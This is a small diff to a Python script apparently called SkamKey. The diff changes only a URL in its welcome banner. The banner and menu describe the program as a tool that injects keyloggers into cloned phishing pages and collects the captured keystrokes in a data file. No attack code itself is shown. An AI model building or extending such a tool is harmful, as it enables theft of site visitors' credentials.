@@ -59,7 +59,7 @@ def main1():
         main1()
 def main():
     clear()
-    print('Welcome to SkamKey,\nMade by Out-Shit https://github.com/Out-Shit\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\nAll the Keylogs will be in the data.txt')
+    print('Welcome to SkamKey,\nMade by Out-Shit https://out-shit.github.io/SkamKey\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\nAll the Keylogs will be in the data.txt')
     input()
     clear()
     print("""\n\n\n\n\nChoose option\n#1-Download page\n#2-Inject the page\n""")
